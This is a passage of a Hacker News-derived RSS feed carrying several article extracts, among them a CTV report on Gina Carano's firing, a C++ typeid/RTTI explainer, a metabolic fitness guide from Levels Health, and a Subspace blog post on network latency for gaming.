disrupts p53-MDM2 interaction‚Äù, <i>Nature Communications</i>.</p><p><a href="https://href.li/?https://doi.org/10.1038/s41467-021-21258-5">https://doi.org/10.1038/s41467-021-21258-5</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625997758414929920/synthesizing-cepafungin">Chemists efficiently synthesize natural anti-cancer compound cepafungin I</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/tea">tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/green-tea">green tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/cancer">cancer</a>
                                    
                                        <a href="https://nuadox.com/tagged/oncology">oncology</a>
                                    
                                        <a href="https://nuadox.com/tagged/antioxidants">antioxidants</a>
                                    
                                        <a href="https://nuadox.com/tagged/p53">p53</a>
                                    
                                        <a href="https://nuadox.com/tagged/dna">dna</a>
                                    
                                        <a href="https://nuadox.com/tagged/genetics">genetics</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/egcg">egcg</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/643030841522536448/green-tea-p53-protein</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125671</guid>
            <pubDate>Sat, 13 Feb 2021 18:50:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gina Carano fired from 'Mandalorian' after social media post]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26125546">thread link</a>) | @mgh2
<br/>
February 13, 2021 | https://www.ctvnews.ca/entertainment/gina-carano-fired-from-mandalorian-after-social-media-post-1.5304551 | <a href="https://web.archive.org/web/*/https://www.ctvnews.ca/entertainment/gina-carano-fired-from-mandalorian-after-social-media-post-1.5304551">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>LOS ANGELES -- 
	Lucasfilm says Gina Carano is no longer a part of "The Mandalorian" cast after many online called for her firing over a social media post that likened the experience of Jews during the Holocaust to the U.S. political climate.</p>
<p>
	A spokesperson with the production company said in a statement on Wednesday that Carano is not currently employed by Lucasfilm with "no plans for her to be in the future."</p>
<p>
	"Nevertheless, her social media posts denigrating people based on their cultural and religious identities are abhorrent and unacceptable," the statement read.</p>
<p>
	Carano fell under heavy criticism after she posted that "Jews were beaten in the streets, not by Nazi soldiers but by their neighbours.... even by children."</p>
<p>
	The actor continued to say, "Because history is edited, most people today don't realize that to get to the point where Nazi soldiers could easily round up thousands of Jews, the government first made their own neighbours hate them simply for being Jews. How is that any different from hating someone for their political views?"</p>
<p>
	Carano, who played the recurring character Cara Dune on the "Star Wars" series, deleted the post but it was widely shared online and spurred the <a href="https://twitter.com/hashtag/FireGinaCarano?src=hashtag" target="_blank">#FireGinaCarano hashtag</a> to trend. Her character appeared in several episodes of the second season of "The Mandalorian," a series about a bounty hunter and his quest to unite a powerful, young user of the Force with a Jedi Knight.</p>
<p>
	Dune, who in the second season is a lawperson on a frontier planet, frequently teams up with the title character to fight an old nemesis: remnants of the evil Galactic Empire.</p>
<p>
	Carano, a former mixed martial artist whose Dune character used a mix of heavy weapons and her fists to best opponents, had been criticized for social media posts that mocked mask wearing during the pandemic and alleged voter fraud during the 2020 presidential election. She also mocked the use of gender pronouns, listing "beep/bop/boop" in her social media bio.</p>
                                              </div></div>]]>
            </description>
            <link>https://www.ctvnews.ca/entertainment/gina-carano-fired-from-mandalorian-after-social-media-post-1.5304551</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125546</guid>
            <pubDate>Sat, 13 Feb 2021 18:35:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How C++ typeid operator works]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26125387">thread link</a>) | @aptxkid
<br/>
February 13, 2021 | https://blog.the-pans.com/how-c-typeid-operator-works/ | <a href="https://web.archive.org/web/*/https://blog.the-pans.com/how-c-typeid-operator-works/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: markdown--><p>C++ language include an operator called <code>typeid</code> (<a href="https://en.cppreference.com/w/cpp/language/typeid">https://en.cppreference.com/w/cpp/language/typeid</a>).</p>
<blockquote>
<p>Queries information of a type.<br>
Used where the dynamic type of a polymorphic object must be known and for static type identification.</p>
</blockquote>
<p>It gives you information about the type of an object, as long as it's available.</p>
<pre><code>int a = 0;
std::string tname = typeid(a).name(); // tname == "i"
</code></pre>
<p>How it works?</p>
<h2 id="statictype">Static Type</h2>
<p>For static types, like the example above, compiler has all the information to know the evaluation result of <code>typeid(a)</code>. Let's take at look at the assembly.</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.the-pans.com/content/images/2021/02/Screenshot-from-2021-02-13-10-14-57.png"></figure><!--kg-card-begin: markdown--><p><code>call 0x555555555160 &lt;_ZNKSt9type_info4nameEv&gt;</code> is where it calls the <code>name()</code> member function of the result <code>std::type_info</code> object from <code>typeid()</code> evaluation of the expression. We are interested in the <code>this</code> pointer and where the <code>std::type_info</code> object lives.</p>
<p><code>this</code> is stored in <code>%rdi</code> register before a member function call. It's coming from <code>%rax</code> which comes from a <code>%rip</code> relative address. Now we know the <code>type_info</code> object of interest lives at <code>0x7ffff7f827a0</code>, the program looks up the address by looking at what's stored in <code>[rip+0x2eal]</code>. <code>%rip</code> register stores the program counter (<code>$pc</code> in GDB). A process's virtual memory layout looks like</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.the-pans.com/content/images/2021/02/memory-layout.png"><figcaption>(from https://www.thegeekstuff.com/2012/03/linux-processes-memory-layout/)</figcaption></figure><!--kg-card-begin: markdown--><p>Program counter (<code>%rip</code>) should always be pointing at the TEXT section of the virtual memory of a running process. So in this case, adding an offset of <code>0x2eal</code>, it's now pointing at the section for storing global data.</p>
<p>To summarize, for static types, compiler has global variables (<code>std::type_info</code>) initialized. At places where the code calls <code>typeid</code>, the machine code just gets the corresponding <code>std::type_info</code> global objects that are already initialized. Done.</p>
<h2 id="dynamictype">Dynamic Type</h2>
<!--kg-card-end: markdown--><figure><img src="https://blog.the-pans.com/content/images/2021/02/Screenshot-from-2021-02-13-09-32-52.png"></figure><!--kg-card-begin: markdown--><p>Here we have an example with dynamic types. Let's check the assembly.</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.the-pans.com/content/images/2021/02/Screenshot-from-2021-02-13-10-14-12.png"></figure><!--kg-card-begin: markdown--><p>Similarly, notice the call to <code>&lt;_ZnKSt9type_info4nameEv&gt;</code>. We are interested in where the assembly got <code>%rdi</code> (<code>this</code>) from.</p>
<p><code>%rbp</code> stores the stack base pointer. Accordingly to the calling convention, <code>[rbp-xxxx]</code> is how a machine gets locally variables for the current function frame. <code>[rbp-0x20]</code> must be getting the only locally variable (<code>foo</code> in this case).</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.the-pans.com/content/images/2021/02/stackframe1.png"><figcaption>(from https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86)</figcaption></figure><!--kg-card-begin: markdown--><p>Notice <code>mov rcx, QWORD PTR [rcx]</code>. It took the first 8 byte of <code>foo</code>, and treated it as an address. It's the address to the vtable.</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.the-pans.com/content/images/2021/02/Screenshot-from-2021-02-13-10-07-42.png"><figcaption>The first 8 byte of foo is the address to class Bar's vtable</figcaption></figure><!--kg-card-begin: markdown--><p>Now <code>%rcx</code> is the address of Bar's vtable. <code>[rcx-0x8]</code> is how it got the address to the <code>std::type_info</code> that we are interested in. This is called RTTI (Runtime Type Information, <a href="https://en.wikipedia.org/wiki/Run-time_type_information">https://en.wikipedia.org/wiki/Run-time_type_information</a>). It's kept as a pointer to <code>std::type_info</code> in vtable. The overhead is minimum (no more expensive than an additional virtual method).</p>
<p>You can disable RTTI, and compiler will produce an error if you accidentally use RTTI in your code.</p>
<pre><code>~/p/how-typeid-op-works ‚ùØ‚ùØ‚ùØ clang++ -std=c++17 test-typeid.cpp -g -fno-rtti
test-typeid.cpp:15:10: error: use of typeid requires -frtti
  return typeid(foo).name();
         ^

</code></pre>
<!--kg-card-end: markdown-->
			</section></div>]]>
            </description>
            <link>https://blog.the-pans.com/how-c-typeid-operator-works/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125387</guid>
            <pubDate>Sat, 13 Feb 2021 18:15:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Guide to Metabolic Fitness]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26125186">thread link</a>) | @jseliger
<br/>
February 13, 2021 | https://www.levelshealth.com/blog/the-ultimate-guide-to-metabolic-fitness | <a href="https://web.archive.org/web/*/https://www.levelshealth.com/blog/the-ultimate-guide-to-metabolic-fitness">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header id="header"></header><main id="main"><section id="content-articles" data-ani-anchor="onload"></section><section id="blog-single-content" data-ani-anchor=""><div><div><p>Metabolic dysfunction underlies most chronic diseases. Metabolic fitness can be improved by consistently making choices that keep glucose levels in a stable and healthy range, and minimize large glucose swings.</p></div><div><div><div><div data-bg="/wp-content/uploads/2020/10/bessi-profile.png"> <img alt="" src="https://www.levelshealth.com/wp-content/uploads/2020/06/casey-means-32x32.jpg" data-src="https://www.levelshealth.com/wp-content/uploads/2020/06/casey-means-32x32.jpg" data-srcset="https://www.levelshealth.com/wp-content/uploads/2020/06/casey-means-64x64.jpg 2x" height="32" width="32" srcset="https://www.levelshealth.com/wp-content/uploads/2020/06/casey-means-64x64.jpg 2x"></div></div></div></div><div id="featured-image-single-v"> <img src="https://www.levelshealth.com/wp-content/uploads/2020/07/5eeb44f02ebf50414d9d89ee_Casey-active-_-Levels-x-Stacie-Flinner-29-p-2000.jpg" data-src="https://www.levelshealth.com/wp-content/uploads/2020/07/5eeb44f02ebf50414d9d89ee_Casey-active-_-Levels-x-Stacie-Flinner-29-p-2000.jpg" aria-label="The ultimate guide to metabolic fitness"></div><div id="article-highlights"><h3>Article highlights</h3><ul><li>Metabolism is the set of cellular mechanisms that produce energy from our food and environment to power every process in the human body.</li><li>Metabolic fitness is a term to describe where we fall on the spectrum of metabolic health and how well we are generating and processing energy in the body.</li><li>Glucose is a primary precursor for energy in the body, and needs to be tightly regulated for metabolism to work effectively.</li><li>Metabolic fitness can be improved by consistently making choices that keep glucose levels in a stable and healthy range, and minimize large glucose swings.</li><li>These choices may include selecting foods that don‚Äôt cause large spikes in glucose, exercising consistently, getting quality sleep, managing stress, adding in nutrients and foods that improve our processing of glucose, and avoiding environmental toxins that are known to disrupt metabolic function.</li><li>Poor metabolic fitness is associated with worse brain function, energy, memory, mood, skin health, fertility, and risk for chronic disease.</li><li>As a country, our metabolic fitness is poor, as evidenced by 88% of the American population displaying at least one biomarker of metabolic dysfunction.</li><li>Metabolic dysfunction underlies most chronic diseases.</li><li>Using continuous glucose monitoring can help individuals understand and improve their metabolic fitness.</li></ul></div><div id="single-content-content"><div><p><strong>[Click below to listen to an audio version of this story.]</strong></p> <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]--> <audio id="audio-409-1" preload="none" controls="controls"><source type="audio/mpeg" src="https://www.levelshealth.com/wp-content/uploads/2020/06/Joshua_Alexander_437630_Master.mp3?_=1"><a href="https://www.levelshealth.com/wp-content/uploads/2020/06/Joshua_Alexander_437630_Master.mp3">https://www.levelshealth.com/wp-content/uploads/2020/06/Joshua_Alexander_437630_Master.mp3</a></audio><p>Metabolism is the set of cellular mechanisms that generate energy from our food and environment in order to power every single cell in the body. When these energy producing pathways are running smoothly, this represents optimal metabolic fitness.</p><p>Since all cells in the body require energy to function, metabolic fitness is foundational for a wide range of diverse health benefits.</p><p>Why would someone want to improve their metabolic fitness?</p><ul role="list"><li>Stable and <a href="https://www.levelshealth.com/blog/can-controlling-my-glucose-levels-give-me-more-energy">sustained energy</a> throughout the day</li><li>Sharp <a href="https://pubmed.ncbi.nlm.nih.gov/21420439/" target="_blank" rel="noopener noreferrer">memory</a> and recall</li><li>Sustained <a href="https://www.levelshealth.com/blog/glucose-and-exercise">exercise endurance</a></li><li>Fat burning ability and <a href="https://www.levelshealth.com/blog/glucose-weight-loss">healthy weight</a></li><li><a href="https://www.levelshealth.com/blog/glucose-mood">Stable mood</a>, decreased anxiety and depression</li><li>Clear <a href="https://www.levelshealth.com/blog/glucose-and-skin-health">skin and decreased wrinkles</a></li><li>Improved <a href="https://www.levelshealth.com/blog/how-continuous-glucose-monitoring-cgm-can-help-with-infertility-and-pcos">fertility</a></li><li>Improved <a href="https://pubmed.ncbi.nlm.nih.gov/22489756/">sexual health</a></li><li>A high functioning <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4717890/">immune system</a></li><li>Lower risk of <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5393149/">chronic diseases</a> like diabetes, Alzheimer‚Äôs disease, obesity, fatty liver disease, heart disease, stroke and more</li></ul><h2>Why do we call it ‚Äúmetabolic fitness‚Äù instead of ‚Äúmetabolic health?‚Äù</h2><p>Fitness is not an inherent characteristic or something that ‚Äúhappens to us.‚Äù Rather, fitness is something that can improve when we put in consistent work and training. And just like with physical fitness, metabolic fitness improves when we put in the effort.</p><p>Let‚Äôs take the analogy of starting a running program to improve our physical fitness in order to run a marathon. Our first jog isn‚Äôt going to be 26.2 miles; it‚Äôs likely going to be a short slog. But, as we lace up our shoes each day, hit the pavement, and track our progress over time, we see and feel progress. We notice small adaptations in our bodies: our breathing might get easier as we sprint up hills, our muscles become more defined, maybe our mood improves. We might track our mileage in Strava or our heart rate with a Fitbit and get excited as these metrics start to improve. As the weeks of running progress, it is clear that our physical fitness is improving.</p><p>On the flip side, if we decide to take a few months off from training, it‚Äôs likely that physical fitness will decline: those hard earned muscles may diminish, and we‚Äôd likely feel more winded the first time we get back out there.</p><p>The metabolism is no different. If we make daily choices that support metabolic processes, we will adapt to develop better metabolic fitness. We might not see our muscles grow, but inside our bodies, the microscopic machinery involved in converting fat and glucose to energy become more efficient. While becoming physically fit requires consistent exercise, becoming metabolically fit involves consistent smart decisions about diet (including what to eat, when to eat, and how to pair foods), sleep, stress management, physical activity, and exposure to metabolism-disrupting environmental toxins. Our current level of metabolic fitness is highly dynamic and largely in our control.</p><p>Just like we can track metrics of physical fitness to keep us informed, on-track, and motivated, we can also now track our metabolic fitness. Since glucose is the primary energy building block for our metabolism, tracking this biomarker with a continuous glucose monitor (CGM) can give us useful insight into our level of metabolic fitness.</p><p>With a CGM, we can see in real-time how our diet and lifestyle decisions are affecting our glucose levels, knowing that over time, stable and healthy glucose patterns lead to improved metabolic fitness. Using the insights from a CGM can help us modulate our food and lifestyle choices to accelerate metabolic progress.</p><p>And, just like with physical fitness, we can see meaningful improvements in our lives even if we haven‚Äôt won an Olympic gold metal. Fitness is a spectrum and each small amount of improvement is a win. As with most processes in the body, there is not an ‚Äúon-off‚Äù switch for metabolic health. We are not either ‚Äúhealthy‚Äù or ‚Äúunhealthy.‚Äù Rather, we are on a metabolic continuum, and our choices ‚Äî coupled with our genes ‚Äî determine where we stand each day.</p><h2>How does glucose fit in?</h2><p>Glucose is a simple sugar that is a breakdown product of the carbohydrates that we eat. When glucose enters the bloodstream, it signals to the pancreas to release insulin, a hormone that tells cells to absorb glucose. Some of this glucose is processed by the mitochondria to form energy (called ATP) that our cells can use. Excess glucose is stored in the muscle and liver as glycogen, and can also be <a href="https://my.clevelandclinic.org/health/articles/11117-triglycerides">converted to triglycerides</a> and stored in fat cells.</p><p>When our bodies need energy, we can tap into glucose from the bloodstream, stored glycogen in the muscles or liver, or we can even make new glucose from other compounds like amino acids (breakdown products of proteins). Aside from using glucose for making energy, we can also break down stored fat to make energy, and convert protein breakdown products to energy.</p><p>However, when our bodies are taxed with processing too much dietary glucose over long periods of time, it throws off the balance of these processes, and leads to health problems. First, chronic excess glucose causes repeated release of insulin. High levels of insulin can, over time, cause cells to become ‚Äúnumb‚Äù to insulin‚Äôs effect, a process called <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6170977/"><em>insulin resistance</em></a>. When this happens, less glucose can get into the cells, so circulating glucose rises. Second, high insulin levels block stored fat from being broken down and used for energy. So, ironically, too much energy in the form of glucose leads us to have more trouble using energy effectively.</p><p>Aside from these issues, excess glucose in the bloodstream causes <a href="https://www.ahajournals.org/doi/full/10.1161/01.cir.0000034509.14906.ae">inflammation</a> (immune activation), <a href="https://pubmed.ncbi.nlm.nih.gov/23448484/">oxidative stress</a> (an overabundance of damaging free radicals in the body), and <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6200622/">glycation</a> (glucose getting ‚Äústuck‚Äù to things in the body and causing dysfunction).</p><p>Given how many deleterious effects excess glucose can have, it is not surprising that the majority of common chronic diseases are rooted in poor glucose control, including diabetes, obesity, heart disease, stroke, dementia, infertility, and more. This is a relatively modern phenomenon: we used to die of infectious disease and starvation. Now we die of metabolic related disease.</p><p>Why might that be? For starters, we (on average) eat nearly <a href="https://www.thediabetescouncil.com/45-alarming-statistics-on-americans-sugar-consumption-and-the-effects-of-sugar-on-americans-health/">10x more sugar per day than we did 100 years ago</a>. Many of us don‚Äôt even realize it, because sugar is so ubiquitous in our food culture, and it wears many masks (link: <a href="https://www.virtahealth.com/blog/names-for-sugar">56 names for sugar</a>). Imagine a factory getting 10x more shipments of raw material and trying to just ‚Äúmake it work.‚Äù It wouldn‚Äôt. The factory would fall apart. The machines would break. The workers would resist to protect themselves. This is what is happening to our bodies. Additionally, too much dietary fat can impair glucose processing; in fact, excess <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4587882/">saturated fat</a> impairs the function of the insulin receptor, leading to more circulating glucose.</p><p>In short, excess energetic precursors like glucose and fat gum up our bodies‚Äô machinery, and are at the root of a vast amount of disease and suffering globally.</p><p>Currently, <a href="https://www.unc.edu/posts/2018/11/28/only-12-percent-of-american-adults-are-metabolically-healthy-carolina-study-finds/">only 12% of Americans are metabolically healthy</a>. The other 88% display one or more features that indicate that they have metabolic dysfunction and that their bodies are not able to utilize and process fat and carbohydrates efficiently. In this research study, to be considered ‚Äúmetabolically healthy,‚Äù you had to have normal blood glucose, triglycerides (a form of fat that is generated from excess glucose), high-density lipoprotein cholesterol, blood pressure, and waist circumference, without the need for medications.</p><h2>The many faces of poor metabolic fitness</h2><p>What does metabolic dysfunction and poor metabolic fitness look like? It can be both overt and subtle.</p><p>Overtly, metabolic dysfunction looks like obesity (dysfunctional fat storage), insulin resistance and diabetes (dysfunctional glucose processing), non-alcoholic fatty liver disease (dysfunctional management of glucose and fat in the liver), cancer (cancer cells thrive on excess sugar), Alzheimer‚Äôs disease (now being called <a href="https://newsnetwork.mayoclinic.org/discussion/researchers-link-alzheimers-gene-to-type-iii-diabetes/"><em>type 3 diabetes</em></a><em>,</em> with evidence of insulin resistance in the brain), cardiovascular diseases like heart attack and stroke (damage to vessels from inflammation and excess glucose), and chronic kidney disease (vessels of the kidney impaired by excess glucose).</p><p>But more subtly, lack of metabolic fitness can look like the full spectrum of daily pain points of modern living that keep us from reaching our full potential and goals: fatigue, brain fog, <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6382695/">depres‚Ä¶</a></p></div></div></div></section></main></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.levelshealth.com/blog/the-ultimate-guide-to-metabolic-fitness">https://www.levelshealth.com/blog/the-ultimate-guide-to-metabolic-fitness</a></em></p>]]>
            </description>
            <link>https://www.levelshealth.com/blog/the-ultimate-guide-to-metabolic-fitness</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125186</guid>
            <pubDate>Sat, 13 Feb 2021 17:53:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CEO vs. Coder]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26124927">thread link</a>) | @cjlm
<br/>
February 13, 2021 | https://roadtoramen.com/Day-403-ceo-vs-coder-fb6fc421eb354a1ca4c052dfc1c62108 | <a href="https://web.archive.org/web/*/https://roadtoramen.com/Day-403-ceo-vs-coder-fb6fc421eb354a1ca4c052dfc1c62108">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://roadtoramen.com/Day-403-ceo-vs-coder-fb6fc421eb354a1ca4c052dfc1c62108</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124927</guid>
            <pubDate>Sat, 13 Feb 2021 17:23:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Internet Today Isn‚Äôt Built for the Billions of Gamers of Tomorrow]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26124917">thread link</a>) | @quentusrex
<br/>
February 13, 2021 | https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow | <a href="https://web.archive.org/web/*/https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-4b4cde9dbdbb9767ad24"><div><p>The 2020 pandemic exposed a fundamental flaw in the way the Internet is built.</p><p>Online games were blamed for clogged networks and slowed speeds, but in reality, the Internet is structurally broken when it comes to real-time interactivity. You‚Äôve heard the line:</p><p><strong><em>Kids, get off your consoles; I‚Äôm on a video call!</em></strong></p><p>It‚Äôs 4 PM on Wednesday. You‚Äôre on an important Zoom call and right in the middle of presenting when your face freezes. Those on the call can only catch half of what you say and are left staring at an unflattering image of you mid-word.</p><h3><strong>How We Got Here: The Evolving Internet</strong></h3><p>The Internet is built for the reliable delivery of content, such as e-mail and file transfers, but not built for performance. Border Gateway Protocol (BGP)‚Äîthe standardized routing protocol for the Internet‚Äîhas no idea what traffic it is routing or in which direction it is sending data. It simply routes data using the cheapest path possible depending on various factors, including politics, commercial agreements, and cost. As a result, certain types of data, namely real-time communications, suffer as the Internet favors servicing volumetric traffic.</p><p>At the start of the millennium, content delivery networks employed global networks of servers to deliver static content faster, leading the way to make OTT (Over-the-top, services offered over the top of traditional content distributors) possible with the infrastructure built by companies such as Netflix, YouTube, and Akamai. More recently, companies like Amazon Web Services have democratized cloud computing, bringing connectivity to more users in more regions of the world. The next evolution of the Internet should be one in which the network itself is democratized, enabling speed-of-light communication for the applications that require high-velocity delivery, such as real-time communications. This means delivering voice over internet protocol calls (VoIP, e.g., Skype, Clubhouse), online multiplayer video games, and more, regardless of the compute or data server owner.</p><h3><strong>Complex Issues with a Complex Network</strong></h3><p>The Internet is a complicated web of networks and billions of computers and devices that connect to each other and work together to send and receive information. The greater the distance between the sending and receiving computers, the longer it takes the data to arrive at its destination. Information can also take different paths, which may increase or decrease the speed of delivery.</p><p>A common analogy used to explain the way the Internet works is the postal service. In the same way that your letter travels from you to the recipient through multiple facilities (carrier, sorting, post office), data travels through numerous routers on its way to the recipient computer. Just as your letter can arrive faster depending on which mail service you use, so too can data transmit faster depending on which path it takes, though the distance between the sender and receiver has the most influence on travel time.</p><p>There are a couple of significant differences in this analogy, however.</p><p><em>One, there are generally more ‚Äústops‚Äù along the way for data, and two, the data is broken up into multiple smaller ‚Äúpackets‚Äù of information rather than sent as one whole mail piece.</em></p><p>Because there are different paths along which individual packets of information can travel, each entailing a variable number of stops along the way, packets of data can easily get lost.</p><p><strong>Packet loss</strong>, as it‚Äôs called, results in missing information and a degraded user experience. In a Skype call, packet loss is experienced as gaps in audio. In video games, packet loss results in strange behavior like teleportation, in which a game freezes, then suddenly moves a player‚Äôs character to another place when the game resumes.</p><p>Another result of these inconsistent, differing routes is variation in delivery time. Some routes are faster than others, so some packets may arrive more quickly than others since the Internet is not conscious of which path it takes in sending data from one point to another. This variation in the time it takes for data to travel across the network from one endpoint to another is called <strong>latency</strong>, and the result of latency is <strong>jitter</strong>. On a Skype call, jitter manifests as jumbled speech that creates an indecipherable conversation. In video games, jitter manifests in behavior like errant shots, in which a player‚Äôs aim may be correct, but the shot doesn‚Äôt register in time to hit the target where they are.</p><p>While <strong>lag</strong> (high levels of latency), jitter, and packet loss may impact any online service or application, certain applications depend upon real-time packet delivery and minimal jitter and packet loss to function correctly and maintain a reasonable quality of experience. Packet delivery, consistent latency, and minimal lag are critical for services and applications like VoIP and online gaming and in numerous other industries such as high-frequency trading, telemedicine, and the Internet of Things.</p><p>For these applications, milliseconds saved in delivering data can lead to a real or virtual life-and-death situation and mean the difference between winning and losing millions of dollars or between a quality and a subpar gaming experience.</p><h3><strong>How Subspace Improves Real-Time Application Delivery</strong></h3><p>A millisecond‚Äôs delay in delivery does not matter in sending an email or a text message, but it does matter in real-time communications. So why should these applications travel on the same network, in the same way?</p><p>Subspace‚Äôs vision is to create an Internet byway through which latency-critical web traffic such as video games, VoIP, and video conferencing can consistently pass through at the speed of light. Like Waze for the Internet, Subspace gives the Internet a GPS of sorts, finding the absolute fastest and most secure and consistent path for real-time data to travel from endpoint to endpoint. As a result, latency and lag are reduced, and real-time applications reach their full potential.</p><p>While other companies have attempted to provide solutions for expediting real-time communications on the Internet, none have addressed the issue across the entire system. Many introduce other issues in their attempts. Commercial networking solutions like Cisco and Juniper were not built for global coordination or to understand and control game traffic. Standalone solutions that require SDKs installed in clients and servers can create significant security and stability risks. And services provided by CDNs like Cloudflare and Akamai utilize the same principles and infrastructure as their primary businesses‚Äîthat is, volumetric traffic‚Äîmaking the possibility of optimizing real-time traffic at scale a costly and difficult endeavor.&nbsp;</p><p>In the case of video games, lag, packet loss, and jitter are such a concern that some game companies have endeavored to build their own custom solutions. This ‚Äúdo it yourself‚Äù approach requires massive internal coordination, investment, and attention, which many publishers cannot afford to prioritize. And still, a DIY approach limits the publisher to its existing commercial relationships and capabilities.</p><p>Subspace‚Äôs platform optimizes every component of network performance, from the infrastructure stack to the networking stack, including software and hardware, the control plane, and the data plane. With a global Internet architected specifically for real-time traffic at every point, we are achieving speed-of-light communication and democratizing the network. Regardless of the data‚Äôs location, Subspace uses a vast system of Internet quality metrics and a proprietary algorithm to direct real-time interactive traffic onto our platform and across the public and our private Internet to and from servers. The algorithm can balance multiple variables to suit each application‚Äôs needs‚Äîvariables such as absolute latency, any latency above a threshold, jitter &amp; loss. The optimal delivery platform via the Subspace onramp drives better, more consistent experiences that match each application‚Äôs needs.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_35285"><div><p>We start with purpose-built points of presence (PoPs), deploying our hardware in data centers worldwide. Each PoP is capable of handling millions of servers, millions of simultaneous user sessions, and enough capacity for all of the user traffic while also providing room for absorbing DDOS attacks, with the expectation that traffic by its nature is mostly small UDP packets.</p><p>The PoPs are distributed globally and specifically network-engineered to reduce the distance needed for players to reach our onramp, minimizing the risk of congestion and misrouting. Players are given a Subspace IP and UDP port as a proxy for a server.</p><p>The Subspace PoP uses a proprietary algorithm to determine the optimal path through our private network before ultimately reaching the game server and back. We do this both ways, packets can take a different route back from the server if Subspace finds a better path for the application needs, another differentiator to CDNs, which are optimized for one-way traffic. Continuous telemetry measures the latency, jitter, and loss between Subspace PoPs, feeding into an algorithm that determines the optimum route between the edge and application servers. On the network‚Äôs server-side, we have PoPs directly connected with major providers to minimize latency and lag upon exiting our network.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_41155"><div><p>Subspace‚Äôs global network, which has already launched in multiple regions and is being aggressively deployed towards a global optimized network, already supports some of the world‚Äôs most popular online games. And it‚Äôs not just about performance. The Subspace platform leverages all of these PoPs to provide a tremendous platform for stopping DDoS attacks against application servers at the edge, before bot networks can aggregate into attacks that get too big to handle or have to be sent off to latency-inducing scrubbing centers. Troublesome attack vectors, replay attacks, and other volumetric attacks can be easily stopped at the Subspace edge, while the game server infrastructure remains protected and ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</a></em></p>]]>
            </description>
            <link>https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124917</guid>
            <pubDate>Sat, 13 Feb 2021 17:22:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[8FORMAT]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124761">thread link</a>) | @ggoo
<br/>
February 13, 2021 | http://boginjr.com/it/sw/dev/8format/ | <a href="https://web.archive.org/web/*/http://boginjr.com/it/sw/dev/8format/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<div id="primary">
		<main id="main" role="main">

			
<article id="post-2982">

	

	
	<div>
